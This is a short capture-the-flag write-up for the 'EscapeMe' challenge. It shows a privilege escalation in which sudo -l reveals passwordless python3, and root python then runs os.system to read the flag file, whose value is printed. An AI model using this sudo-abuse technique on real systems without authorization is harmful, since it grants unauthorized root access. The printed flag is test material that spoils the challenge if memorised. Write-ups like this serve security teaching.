## EscapeMe (100 points)

#### Solved by hieplpvip

```
Can you escape me!

ssh ctf@61.28.237.24 -p30402 password: hcmus-ctf

author: pakkunandy

p/s: the flag.txt is in the /home/ctf. If it is not exist. Please wait and then login again.
```

Let's check what we can run as root:

```
$ sudo -l
Matching Defaults entries for ctf on escapeme-5c599b968f-gwjcv:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf may run the following commands on escapeme-5c599b968f-gwjcv:
    (ALL) NOPASSWD: /usr/bin/python3
```

We can run `python3` as root without password. We will use this to get the flag:

```
$ sudo python3
Python 3.6.9 (default, Jan 26 2021, 15:33:00)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("cat /home/ctf/flag.txt")
HCMUS-CTF{privilege_escalation_is_fun!!!}
```

**Flag:** `HCMUS-CTF{privilege_escalation_is_fun!!!}`

### References

- [https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/)
